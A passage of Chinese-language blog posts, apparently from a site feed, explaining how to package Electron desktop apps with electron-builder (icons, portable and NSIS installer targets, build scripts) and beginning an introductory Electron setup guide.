class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//省略内容。..</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;productName&quot;</span><span class="punctuation">:</span><span class="string">&quot;program-name&quot;</span><span class="punctuation">,</span><span class="comment">////省略内容</span></span><br><span class="line">    <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/icon1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//省略内容。..</span></span><br><span class="line">    <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">      <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/icon2.png&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run packwin</span><br></pre></td></tr></table></figure><p>执行命令后，软件中前面提到的三处图标会是配置中<code>win</code>后方的<code>icon2.png</code>。</p><p>另外，如果使用<code>icon</code>图标，需要使用相应的工具进行格式转换，不要只改后缀，别问我怎么知道的。</p><h2 id="打包成单文件可执行程序">打包成单文件可执行程序</h2><p>全局安装 electron-builder：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install electron-builder -g</span><br></pre></td></tr></table></figure><p>在<code>package.json</code>中如下配置（示例）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制粘贴时记得按照实际情况进行修改，并删除所有注释内容！</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A minimal Electron application&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;productName&quot;</span><span class="punctuation">:</span><span class="string">&quot;program-name&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//省略。..</span></span><br><span class="line">    <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;appId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;helloworld&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="comment">//省略。..</span></span><br><span class="line">      <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;portable&quot;</span><span class="comment">//填写这个参数即可。实际上这里可以填写多个参数标签，一行一个，除最后一个外结尾需加英文逗号</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>由于在<code>win</code>配置项中添加，故执行对应打包命令后等待构建与打包（比只构建文件夹项目要久一些），随后在输出文件夹（例如前面配置文件中示例的<code>【projectroot】/dist</code>目录中）可以找到与配置文件中<code>build</code>下方<code>productName</code>参数同名的文件。</p><p>该单文件可以直接双击执行，但启动速度貌似要慢一点。</p><p>（不写<code>appId</code>貌似会不识别 target 那里某些标签从而报错？）</p><h2 id="打包成安装程序">打包成安装程序</h2><p>很显然直接这么做打包出来的的是一个文件夹，这在有些情况下是不方便分发的。得益于 nsis 脚本，我们可以方便地利用 electron-builder 打包安装文件。</p><p>在<code>package.json</code>中如下配置（示例）（注意，<code>nsis</code>的缩进应在<code>build</code>后）。不一定每项都要写，但写了的一定要正确：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制粘贴时记得按照实际情况进行修改，并删除所有注释内容！</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A minimal Electron application&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;productName&quot;</span><span class="punctuation">:</span><span class="string">&quot;program-name&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//省略。..</span></span><br><span class="line">    <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">      <span class="comment">//省略。..</span></span><br><span class="line">      <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;nsis&quot;</span><span class="comment">//选择 nsis 标签</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nsis&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;oneClick&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 是否一键安装</span></span><br><span class="line">      <span class="attr">&quot;allowElevation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 允许请求提升。 如果为 false，则用户必须使用提升的权限重新启动安装程序。</span></span><br><span class="line">      <span class="attr">&quot;allowToChangeInstallationDirectory&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 允许修改安装目录</span></span><br><span class="line">      <span class="attr">&quot;perMachine&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 是否开启安装时权限限制（此电脑或当前用户）</span></span><br><span class="line">      <span class="attr">&quot;installerIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/favicon2.png&quot;</span><span class="punctuation">,</span><span class="comment">// 安装图标</span></span><br><span class="line">      <span class="attr">&quot;uninstallerIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/favicon2.png&quot;</span><span class="punctuation">,</span><span class="comment">//卸载图标</span></span><br><span class="line">      <span class="attr">&quot;uninstallDisplayName&quot;</span><span class="punctuation">:</span><span class="string">&quot;卸载这个软件&quot;</span><span class="punctuation">,</span><span class="comment">//卸载提示语</span></span><br><span class="line">      <span class="attr">&quot;installerHeaderIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/favicon2.png&quot;</span><span class="punctuation">,</span> <span class="comment">// 安装时头部图标</span></span><br><span class="line">      <span class="attr">&quot;createDesktopShortcut&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 创建桌面图标</span></span><br><span class="line">      <span class="attr">&quot;createStartMenuShortcut&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">// 创建开始菜单图标</span></span><br><span class="line">      <span class="attr">&quot;shortcutName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Electron-test-sc&quot;</span><span class="punctuation">,</span> <span class="comment">// 图标名称，填写你软件的名称即可</span></span><br><span class="line">      <span class="attr">&quot;include&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build/script/installer.nsh&quot;</span><span class="punctuation">,</span> <span class="comment">// 包含的自定义 nsis 脚本 这个对于构建需求严格得安装过程相当有用。只是需要修改一下安装位置，卸载提示等等的简单操作建议使用</span></span><br><span class="line">      <span class="attr">&quot;script&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;build/script/installer.nsh&quot;</span><span class="punctuation">,</span> <span class="comment">// NSIS 脚本的路径，用于自定义安装程序。 默认为 build / installer.nsi。若需要炫酷的安装过程可使用这个</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如果仅为了实现一个极其简单的安装卸载界面，nsis 片段这么写就足够了：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;nsis&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;oneClick&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;perMachine&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;allowElevation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;allowToChangeInstallationDirectory&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这个安装卸载界面包含：设置为所有用户或自仅自己安装、设置安装路径、安装完成是否自动运行（用户可取消勾选）；安装目录下方有卸载文件（通常情况下它含有 Uninstall 等字样）。</p><h3 id="修改打开的页面">修改打开的页面</h3><p>在<code>main.js</code>中找到约第 16 行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// and load the index.html of the app.</span></span><br><span class="line">mainWindow.<span class="title function_">loadFile</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以将<code>index.html</code>改成其他的，例如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// and load the index.html of the app.</span></span><br><span class="line">mainWindow.<span class="title function_">loadURL</span>(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>打开后即为百度首页。（URL 链接与本地文件在这里写的内容有微小差别）</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 electron-builder 打包应用程序</title>
      <link href="/posts/3514521534/"/>
      <url>/posts/3514521534/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文默认你已经配置好基本的 Electron 工具，没有的请自行百度。</p><p>鉴于 Electron 的核心模块中没有捆绑任何用于打包或分发文件的工具，因此需要使用额外的工具来打包应用程序。官方教程中<code>打包您的应用程序</code>处介绍了 Electron-Forge，但很快又认识到另一个打包工具。为防止混淆，这个打包工具新开一篇进行介绍与使用。</p><p>Electron 部分文件下载可能较慢，可在相关命令前直接添加以下内容后执行（以<code>electron-builder --dir</code>命令为例）（不保证所有命令前添加这个均不会出错）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELECTRON_MIRROR=http://npmmirror.com/mirrors/electron/ electron-builder --dir</span><br></pre></td></tr></table></figure><h2 id="序">序</h2><p>由于能力与需求的问题，文章重点放在 win 平台，其他平台的配置主要通过参阅他人经验完成。文中部分配置命名可能有所不同，请根据上下文判断。</p><p>由于 npm 镜像在国外，因此需要有足够的耐心以应对首次安装配置。文中部分命令处同时给出 npm 与 yarn 命令，使用 yarn 命令可能会获得一点点的提升（包括但不限于速度）。但其中仍存在一些步骤执行速度较慢。</p><p><strong>不建议首次阅读时就跟着一步步下去实践</strong>，因为有些附加内容会比较靠后。</p><p>文中<code>项目根目录</code>未做说明则使用<code>【projectroot】</code>代替。文中涉及包括但不限于文件路径、文件名、配置项命名、执行命令的部分均需根据自己实际情况进行调整。</p><h2 id="安装与基本配置">安装与基本配置</h2><p>在<code>【projectroot】</code>目录下打开终端，执行命令安装预配置组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>执行命令安装 electron-builder 于开发环境下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install electron-builder --save-dev</span><br></pre></td></tr></table></figure><p>随后在项目的<code>package.json</code>中添加执行脚本（复制粘贴时记得删了注释）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A minimal Electron application&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//以下为添加脚本，前方引号中的自符可自定义，若修改与此处不同则之后的命令需根据实际情况修改</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot; electron-builder --dir &quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;packwin&quot;</span><span class="punctuation">:</span> <span class="string">&quot; electron-builder --win --x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;installdeps&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-builder install-app-deps&quot;</span><span class="comment">//为方便起见在这里配置脚本执行</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>electron-builder 是一个用于将 Electron 应用程序打包为可执行文件的工具。install-app-deps 是 electron-builder 的一个子命令，用于在生成可执行文件之前安装应用程序的依赖项。</p><p>具体而言，install-app-deps 命令会检查您的应用程序 package.json 文件中所列出的依赖项，并安装它们。这是为了确保您的应用程序可以在任何电脑上正常运行，而不需要手动安装依赖项。</p></blockquote><p>完成并保存文件，在<code>【projectroot】</code>目录打开终端，执行命令，编译<code>electron-builder install-app-deps</code>APP 依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">两个命令二选一执行，下同。若未安装 Yarn 可在网上搜索获取方法。</span></span><br><span class="line">npm run installdeps</span><br><span class="line">yarn installdeps</span><br></pre></td></tr></table></figure><p>之后执行打包 win 平台命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run packwin</span><br><span class="line">yarn packwin</span><br></pre></td></tr></table></figure><p>如果你是首次使用该工具，它会自动下载预编译文件。该步骤可能会很慢，如有需要请自行了解 npm 换源等操作。安装期间建议顺带启用 GitHub 加速工具（例如 Steam++等）。建议使用 yarn，若使用 cnpm 则需另外配置以解决占用过大的问题。</p><p>执行完成后输入命令以打包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line">yarn build</span><br></pre></td></tr></table></figure><p>顺带一提前面这些命令在首次执行安装时已顺带安装 asar、nsis 等组件，后面会提到使用方法。</p><h2 id="构建其他平台的应用程序">构建其他平台的应用程序</h2><p>【说明：此处仅作简单介绍，打包 win 之外平台应用程序不是本文重点】</p><p>为了让编译时少输入点指令，我们可以在项目的<code>package.json</code>中开头配置脚本。前面示例中<code>&quot;packwin&quot;: &quot; electron-builder --win --x64&quot;,</code>含义为：使用 electron-builder 构建 Windows 平台 64 位应用，其他常用平台配置参数如下：</p><table><thead><tr><th>后缀</th><th>含义</th></tr></thead><tbody><tr><td>–mac, -m, -o, --macos</td><td>打包为 macOS 应用程序</td></tr><tr><td>–linux, -l</td><td>打包为 Linux 应用程序</td></tr><tr><td>–win, -w, --windows</td><td>打包为 Windows 应用程序</td></tr><tr><td>–x64</td><td>打包为 x64 应用程序</td></tr><tr><td>–ia32</td><td>打包为 ia32 应用程序（32 位）</td></tr><tr><td>–armv7l</td><td>打包为 armv7l 应用程序（32 位）</td></tr><tr><td>–arm64</td><td>打包为 arm64 应用程序</td></tr><tr><td>–dir</td><td>创建预打包应用程序的文件夹，一般用于测试</td></tr><tr><td>–prepackaged, --pd</td><td>预打包应用程序（可分发格式）的路径</td></tr><tr><td>–projectDir, --project</td><td>项目目录的路径。，默认为当前项目目录</td></tr><tr><td>–config, -c</td><td>配置文件路径。 默认为<code>electron-builder.yml</code>或<code>js</code>、<code>js5</code></td></tr></tbody></table><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">electron-builder -mwl # 同时构建 MacOS、Windows、Linux 下应用程序</span><br><span class="line">electron-builder --linux deb tar.xz # 为 Linux 同时构建 deb 和 tar.xz 分发包</span><br><span class="line">electron-builder --win --x64 # 为 Windows 构建 64 位应用程序</span><br></pre></td></tr></table></figure><p>也可以添加到<code>scripts</code>后面：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A minimal Electron application&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron .&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//省略。..</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot; electron-builder --dir &quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;packmwl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-builder -mwl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;packlinux&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-builder --linux deb tar.xz&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;packwin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron-builder --win --x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//省略。..</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">//省略。..</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>scripts</code>名称可以自定义，命令可按需编写添加，之后执行命令时使用<code>npm run</code>+<code>名称</code>即可。例如按照上面这个配置，在执行打包 win 平台 64 位应用时，只需输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run packwin</span><br></pre></td></tr></table></figure><p>即可代替原本较长的命令，便于记忆与输入。</p><h2 id="参考">参考</h2><blockquote><p><a href="https://www.cnblogs.com/silenzio/p/11639960.html" rel="external nofollow noreferrer">https://www.cnblogs.com/silenzio/p/11639960.html</a><br><a href="https://segmentfault.com/a/1190000016695922" rel="external nofollow noreferrer">https://segmentfault.com/a/1190000016695922</a><br><a href="https://juejin.cn/post/7133163924576272397" rel="external nofollow noreferrer">https://juejin.cn/post/7133163924576272397</a><br><a href="https://segmentfault.com/a/1190000015014923" rel="external nofollow noreferrer">https://segmentfault.com/a/1190000015014923</a><br><a href="https://cloud.tencent.com/developer/ask/sof/106634753" rel="external nofollow noreferrer">https://cloud.tencent.com/developer/ask/sof/106634753</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron初识：将web页面变成桌面应用程序</title>
      <link href="/posts/3639312373/"/>
      <url>/posts/3639312373/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前排提示：使用这东西需要有一定的耐心，配置出故障是正常的。本文虽不是面向小白，但自认为比较详细（恐但凡疏忽便再难成功）。</p><p>之前使用过一个名为 Nativefier 的工具，它基于 Electronjs，可以将网页打包为桌面客户端，颇有意思。玩久了感觉命令写来有点琐碎，故直接尝试 Electron。</p><p>结果耗时超出我的预料，顺带输了不该输的东西再次把本地环境弄乱。尝试良久，一路坎坷，终于打包成功。</p><p>以防以后踩坑再去搜索半天，故于此记录。</p><p>本文不讨论 Electron 技术的缺点。</p><h2 id="说明">说明</h2><ul><li>若无说明，本文描述及举例均为 Windows 平台下操作；</li><li>本文仅为初级用法，完整使用请看 <a href="https://www.electronjs.org/zh/docs/latest/" rel="external nofollow noreferrer">官网文档</a>；</li><li>为行文不过于突兀，可能存在“多余的”文字。<strong>建议全部看完再操作</strong>，<strong>不建议看一步做一步</strong>；</li><li>千万不要多打字或少打字，打错字则更是不可。</li></ul><h2 id="介绍">介绍</h2><blockquote><p>Electron 是一个使用 JavaScript、HTML 和 CSS 构建桌面应用程序的框架。 嵌入 Chromium 和 Node.js 到 二进制的 Electron 允许您保持一个 JavaScript 代码代码库并创建 在 Windows 上运行的跨平台应用 macOS 和 Linux。</p></blockquote><p>只看初级功能，你可以简单粗暴地把它理解为以桌面客户端的方式直接访问 Web 页面。</p><h2 id="使用">使用</h2><h3 id="准备">准备</h3><p>安装 Node.js，可参考 <a href="https://blog.sakurink.eu.org/posts/3902219675/">以前文章</a>。</p><p>由于网络问题，安装时不可避免出现卡慢、丢失等问题，建议尝试换源，例如淘宝镜像 （<a href="https://npmmirror.com/" rel="external nofollow noreferrer">https://npmmirror.com/</a> 或 Yarn <a href="https://yarn.nodejs.cn/en/docs/install" rel="external nofollow noreferrer">https://yarn.nodejs.cn/en/docs/install</a>。使用淘宝源时，只需将 npm 替换为 cnpm 即可，本文未作说明则不单独列出，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install express -g # 官方 npm</span><br><span class="line">cnpm install express -g # 淘宝源 cnpm</span><br></pre></td></tr></table></figure><p>若文中命令处出现 npm 与 yarn 同时存在的情况，则二者择其一执行即可，后文不再重复说明。</p><h3 id="创建应用程序">创建应用程序</h3><h4 id="按照官方流程">按照官方流程</h4><p>首先创建一个文件夹并初始化 npm 包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir my-electron-app &amp;&amp; cd my-electron-app # 创建并进入名为 my-electron-app 的文件夹</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面两个均为初始化命令，二选一</span></span><br><span class="line">npm init</span><br><span class="line">yarn init</span><br></pre></td></tr></table></figure><p>为本教程的目的，有几条规则需要遵循：</p><ul><li>entry point 应为 main.js.</li><li>author 与 description 可为任意值，但对于应用打包是必填项。</li></ul><p>你的 package.json 文件应该像这样：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-electron-app&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello World!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jane Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后，将 electron 包安装到应用的开发依赖中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 